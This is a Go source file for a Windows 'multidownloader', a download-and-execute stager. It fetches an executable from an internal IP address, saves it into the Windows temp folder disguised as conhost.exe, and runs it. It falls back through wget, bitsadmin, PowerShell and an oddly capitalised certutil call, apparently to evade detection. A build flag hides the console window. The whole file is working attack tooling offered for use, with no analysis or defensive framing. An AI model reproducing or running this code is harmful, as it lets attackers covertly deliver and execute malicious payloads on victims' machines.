// compile with GOOS=windows GOARCH=amd64 go build  -ldflags -H=windowsgui -o multidownloader.exe multidownloader.go

package main

import (
	"fmt"
	"os/exec"
)

func main() {
	// Specify the URL of the file to download
	url := "http://192.168.8.254/install.exe"
	// Specify the location to save the downloaded file
	dest := "c:\\windows\\temp\\conhost.exe"

	// Use the wget.exe command to download the file
	cmd := exec.Command("wget.exe", url, "-O", dest)

	// Run the command and check for errors
	if err := cmd.Run(); err != nil {
		// If wget.exe fails, use bitsadmin to download the file
		cmd := exec.Command("bitsadmin", "/transfer", "mydownload", url, dest)
		if err := cmd.Run(); err != nil {
			// If bitsadmin fails, use PowerShell to download the file
			cmd := exec.Command("powershell", "-Command", "Invoke-WebRequest", url, "-OutFile", dest)
			if err := cmd.Run(); err != nil {
				// If PowerShell fails, use certutil to download the file
				cmd := exec.Command("CErtUTIl", "-urlcache", "-split", "-f", url, dest)
				if err := cmd.Run(); err != nil {
					fmt.Println(err)
				} else {
					// If the file was successfully downloaded, run it and exit the program
					cmd := exec.Command(dest)
					if err := cmd.Run(); err != nil {
						fmt.Println(err)
					}
					return
				}
			} else {
				// If the file was successfully downloaded, run it and exit the program
				cmd := exec.Command(dest)
				if err := cmd.Run(); err != nil {
					fmt.Println(err)
				}
				return
			}
		} else {
			// If the file was successfully downloaded, run it and exit the program
			cmd := exec.Command(dest)
			if err := cmd.Run(); err != nil {
				fmt.Println(err)
			}
			return
		}
	} else {
		// If the file was successfully downloaded, run it and exit the program
		cmd := exec.Command(dest)
		if err := cmd.Run(); err != nil {
			fmt.Println(err)
		}
		return
	}
}
